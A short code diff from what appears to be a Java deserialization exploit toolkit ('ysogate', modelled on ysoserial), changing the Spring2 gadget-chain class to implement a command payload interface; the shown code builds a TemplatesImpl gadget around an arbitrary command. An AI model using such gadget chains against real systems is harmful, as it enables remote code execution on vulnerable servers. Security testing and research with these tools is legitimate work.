@@ -12,7 +12,7 @@ import com.h2tg.ysogate.utils.PayloadRunner;
 import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.target.SingletonTargetSource;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -41,7 +41,8 @@ import com.h2tg.ysogate.utils.Reflections;
 		"aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 })
 @Authors({Authors.MBECHLER})
-public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
+public class Spring2 extends PayloadRunner implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
